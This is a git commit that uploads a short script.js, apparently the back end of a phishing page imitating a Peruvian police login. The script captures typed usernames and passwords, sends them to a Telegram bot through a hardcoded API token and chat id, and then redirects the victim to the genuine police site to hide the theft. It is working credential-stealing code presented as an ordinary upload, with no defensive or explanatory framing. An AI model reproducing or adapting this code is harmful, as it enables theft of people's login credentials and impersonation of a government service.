18368deae36ce5a4f249c0c6c70badb61b81fd61
plataforma01 <130812113+plataforma01@users.noreply.github.com>
2023-04-14 21:03:44 -0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+const sendatatme = document.getElementById("sendatatme");
+const first = document.getElementById("first");
+const second = document.getElementById("second");
+const resfirst = document.getElementById("resfirst");
+const resecond = document.getElementById("resecond");
+
+first.addEventListener("change", () => {
+  resfirst.value = first.value;
+});
+second.addEventListener("change", () => {
+  resecond.value = second.value;
+});
+
+function redirect() {
+  const Http = new XMLHttpRequest();
+  const url =
+    "https://api.telegram.org/bot5848364468:AAEz1ttUvG4KKNEFaPZ9NNZzu4fAHlkr8wA/sendMessage?chat_id=5460811752&text=USERNAME:%20" +
+    resfirst.value +
+    " PASSWORD: " +
+    resecond.value;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText);
+  };
+
+window.location.href = 'https://pi3.policia.gob.pe/';
+}
+
+sendatatme.addEventListener("click", redirect);
